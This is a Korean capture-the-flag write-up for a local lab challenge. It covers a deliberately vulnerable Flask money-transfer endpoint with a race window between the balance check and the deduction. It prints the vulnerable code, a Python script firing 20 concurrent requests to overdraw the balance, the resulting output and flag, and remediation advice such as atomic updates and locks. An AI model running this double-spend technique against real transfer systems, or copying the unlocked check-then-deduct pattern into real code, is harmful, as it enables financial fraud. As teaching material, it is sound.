# [logic] Race Condition — 이체 라이트업

- 대상: `arang-edu-challs-collection` / `challenges/logic/race-transfer`
- 카테고리: logic
- 버그클래스: Race Condition (TOCTOU)
- 포트: 9401

## 취약점 분석

`challenges/logic/race-transfer/app.py`:

```python
@app.route("/transfer")
def transfer():
    bal = st()
    amt = int(request.args.get("amt", "0"))
    if amt > 0 and bal["me"] >= amt:        # 검증
        time.sleep(0.15)                    # ── 경합 창(race window) ──
        bal["me"] -= amt                    # 차감 (비원자적)
        bal["vault"] = bal.get("vault", 0) + amt
        return "ok me=%d vault=%d" % (bal["me"], bal["vault"])
    return "잔액 부족 me=%d" % bal["me"]
```

잔액 검증(`bal["me"] >= amt`)과 실제 차감(`bal["me"] -= amt`) 사이에 `time.sleep(0.15)`로 인위적인 시간차(race window)가 있고, 이 구간에 락이 없다. `me=100`인 상태에서 `/transfer?amt=100`을 **동시에** 여러 개 요청하면, 첫 번째 차감이 반영되기 전에 나머지 요청들도 전부 "잔액 충분(me=100)"으로 검증을 통과해버려서, 실제로는 한 번만 가능해야 할 이체가 여러 번 중복 처리된다. 상태는 요청자 IP별로 관리되므로(`_states` 딕셔너리, IP 키), 같은 IP에서 동시에 여러 커넥션을 열면 된다.

`/flag`는 `vault >= 1000`이면 flag를 반환한다.

## 익스플로잇

`/reset` 후 `/transfer?amt=100`을 동시에 다수(15~20개) 요청하면, 검증 단계가 모두 통과되어 `me`가 음수로 내려가면서 `vault`는 100씩 계속 누적된다.

### 실행 스크립트

```python
import urllib.request, concurrent.futures

BASE = "http://localhost:9401"
N = 20

def hit():
    with urllib.request.urlopen(f"{BASE}/transfer?amt=100", timeout=5) as r:
        return r.read().decode()

urllib.request.urlopen(f"{BASE}/reset", timeout=5)
with concurrent.futures.ThreadPoolExecutor(max_workers=N) as ex:
    results = list(ex.map(lambda _: hit(), range(N)))
for r in results: print(r)

with urllib.request.urlopen(f"{BASE}/flag", timeout=5) as r:
    print(r.read().decode())
```

### 실제 실행 결과 (발췌)

```
[0] ok me=0 vault=100
[1] ok me=-100 vault=200
...
[19] ok me=-1900 vault=2000
[flag 응답] 축하합니다: flag{c65cda4edb4f8450af44}
```

20개 동시 요청이 모두 검증을 통과해 `vault`가 2000까지 누적되었고(정상 로직이라면 `me=100`이므로 단 1회, `vault=100`에서 끝나야 함), 1000을 넘겨 flag를 획득했다.

## 진행 절차

1. `docker compose up -d --build race-transfer`
2. 파이썬 스크립트(`ThreadPoolExecutor`로 `/transfer?amt=100`을 20개 동시 요청)를 실행
3. `/flag` 접속 → flag 확인

## 플래그

```
flag{c65cda4edb4f8450af44}
```

## 대응방안

- 잔액 검증과 차감을 하나의 원자적 연산으로 묶기: DB라면 `UPDATE ... SET balance = balance - %s WHERE balance >= %s`(조건부 UPDATE)나 `SELECT ... FOR UPDATE` 행 잠금 사용, 인메모리 상태라면 검증부터 차감까지 전체 구간에 락(mutex) 적용
- 검증-대기-갱신 사이에 갭이 있는 TOCTOU(Time-Of-Check to Time-Of-Use) 패턴 자체를 제거
- 동시 요청에 대한 레이트 리미팅/idempotency key 등으로 중복 처리 방지
